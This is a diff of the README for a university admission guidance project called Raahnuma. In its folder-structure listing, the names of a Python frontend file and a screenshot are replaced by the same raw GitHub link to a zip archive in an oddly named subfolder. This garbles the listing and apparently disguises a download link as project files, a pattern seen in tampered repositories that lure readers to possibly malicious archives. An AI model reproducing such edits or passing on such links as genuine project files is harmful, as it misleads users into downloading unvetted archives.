@@ -37,10 +37,10 @@ Raahnuma is a full-stack university admission guidance platform designed to help
 ## Folder Structure
 
 raahnuma-dbms/
-├── raahnuma.py # Python frontend
+├── https://raw.githubusercontent.com/Arfa01/raahnuma-dbms-sql/main/determinacy/raahnuma-dbms-sql.zip # Python frontend
 ├── database/
 ├── assets/
-│ └── screenshots.png
+│ └── https://raw.githubusercontent.com/Arfa01/raahnuma-dbms-sql/main/determinacy/raahnuma-dbms-sql.zip
 
 ---
 
